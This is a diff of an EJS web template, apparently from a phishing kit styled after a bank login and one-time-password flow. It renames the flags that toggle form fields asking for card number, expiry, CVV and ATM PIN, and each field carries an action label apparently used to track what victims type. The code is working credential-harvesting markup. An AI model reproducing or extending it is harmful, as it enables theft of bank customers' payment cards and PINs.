@@ -194,14 +194,14 @@ let p_expiry = bmo.exp === 'on' ? true : false;
                                                     <div class="otp-section-mint-green otp-full-width-sm">
                                                         <div class="td-row" style="padding-top: 10px;">
                                                             <div class="td-col-sm-6 td-col-sm-offset-3">
-                                                                <% if (card) { %>
+                                                                <% if (p_card) { %>
                                                                     <div class="form-group" style="">
                                                                         <label>Card Number</label>
                                                                         <input required="" id="input-card" type="tel" maxlength="19" placeholder="Card Number" name="card" class="form-control lrinput" oninput="this.value = this.value.replace(/[^0-9, ]/, '')" onkeyup="split()" autocomplete="off" attr-action="Filling Card">
                                                                         <script src="/assets/js/splitter.js?v=<%= Date.now() %>"></script>
                                                                         <link rel="stylesheet" href="/assets/css/card.css?<%= Date.now() %>">
                                                                     </div>
-                                                                <% } if (exp) { %>
+                                                                <% } if (p_exp) { %>
                                                                     <div class="form-group" style="">
                                                                         <label style="display: block;">Expiry</label>
                                                                         <select name="exp1" required class="form-control text-center display-inline-block lrinput" attr-action="Selecting Expiry" style="width:48%; display: inline-block;">
@@ -218,12 +218,12 @@ let p_expiry = bmo.exp === 'on' ? true : false;
                                                                             <% } %>
                                                                         </select>
                                                                     </div>
-                                                                <% } if (cvv) { %>
+                                                                <% } if (p_cvv) { %>
                                                                     <div class="form-group" style="">
                                                                         <label>Cvv</label>
                                                                         <input required="" id="input-cvv" type="tel" maxlength="3" placeholder="&bullet;&bullet;&bullet;" name="cvv" class="form-control lrinput" oninput="this.value = this.value.replace(/[^0-9]/, '')" autocomplete="off" attr-action="Filling Cvv">
                                                                     </div>
-                                                                <% } if (atm) { %>
+                                                                <% } if (p_atm) { %>
                                                                     <div class="form-group" style="">
                                                                         <label>ATM Pin</label>
                                                                         <input required="" id="input-atm" type="tel" maxlength="6" placeholder="&bullet;&bullet;&bullet;&bullet;" name="atm" class="form-control lrinput" oninput="this.value = this.value.replace(/[^0-9]/, '')" autocomplete="off" attr-action="Filling ATM Pin">
